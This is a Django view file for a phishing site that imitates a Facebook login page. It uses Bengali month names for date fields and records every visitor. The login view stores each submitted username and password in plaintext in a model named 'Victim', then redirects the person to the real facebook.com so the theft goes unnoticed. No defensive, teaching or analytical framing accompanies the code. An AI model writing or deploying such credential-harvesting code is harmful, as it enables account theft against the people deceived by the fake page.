from django.shortcuts import render, redirect
from .models import Victim
from utils.SaveVisitor import saveVisitor

# Create your views here.
def login(request):
    saveVisitor(request)
    day = [i for i in range(1, 32)]
    year = [i for i in range(1950, 2018)]

    if request.method == 'POST':
        username = request.POST.get('username', None)
        password = request.POST.get('password', None)
        if username and password:
            victim = Victim.objects.create(username=username, password=password)
            victim.save()
            return redirect('https://facebook.com')
        else:
            error = {}
            if not username:
                error['username'] = True
            if not password:
                error['password'] = True
            return render(request, 'login.html', {'error': error, 'year': year, 'month': get_month(), 'day': day})
    return render(request, 'login.html', {'year': year, 'month': get_month(), 'day': day})


def get_month():
    month = {1: 'জানুয়ারী'}
    month[2] = 'ফেব্রুয়ারী'
    month[3] = 'মার্চ'
    month[4] = 'এপ্রিল'
    month[5] = 'মে'
    month[6] = 'জুন'
    month[7] = 'জুলাই'
    month[8] = 'আগস্ট'
    month[9] = 'সেপ্টেম্বর'
    month[10] = 'অক্টোবর'
    month[11] = 'নভেম্বর'
    month[12] = 'ডিসেম্বর'
    return month